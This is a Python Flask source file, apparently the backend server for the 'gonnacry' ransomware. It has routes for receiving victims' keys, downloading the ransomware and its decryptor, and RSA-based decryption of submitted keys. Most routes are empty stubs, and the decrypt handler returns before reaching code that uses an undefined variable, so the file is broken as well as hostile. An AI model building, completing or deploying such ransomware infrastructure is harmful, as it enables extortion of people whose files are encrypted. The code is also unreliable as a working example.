from flask import Flask, redirect, request, Response
from flask import render_template, url_for
import os
import time
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

with open("private_key.key") as f:
    private_key = f.read()

with open("public_key.key") as f:
    public_key = f.read()

app = Flask("gonnacry-web-server")

@app.errorhandler(404)
def page_not_found(error):
	return Response("nothing to do here ...")

@app.errorhandler(500)
def page_not_found(error):
	return Response("Oops I screwed something ...")


@app.route("/recive-keys/", methods=['POST'])
def recive_keys():
    pass


@app.route("/download-gonnacry/", methods=["GET"])
def download_gonnacry():
    pass


@app.route("/download-decryptor/", methods=["GET"])
def download_decryptor():
    pass


@app.route("/decrypt/", methods=['POST'])
def decrypt():
    data = request.data.decode('UTF-8')

    try:
        data = base64.b64decode(data)
    except base64.binascii.Error:
        return Response('Wrong format key. Expected: b64encoded private key!', status=415)

    return Response(data, status=200)
    
    key = RSA.importKey(private_key)
    cipher = PKCS1_OAEP.new(key)
    try:
        decrypted = ""
        for i in enc:
            ciphertext = cipher.decrypt(i)
            decrypted += ciphertext
    except:
        return Response("Invalid private key!", status=400)
    return Response(decrypted, status=200)


@app.route("/")
def main():
    return 'nothing here ... '

if __name__ == '__main__':

    # Bind to PORT if defined, otherwise default to 5000.
    port = int(os.environ.get('PORT', 5000))
    app.run(host='127.0.0.1', port=port)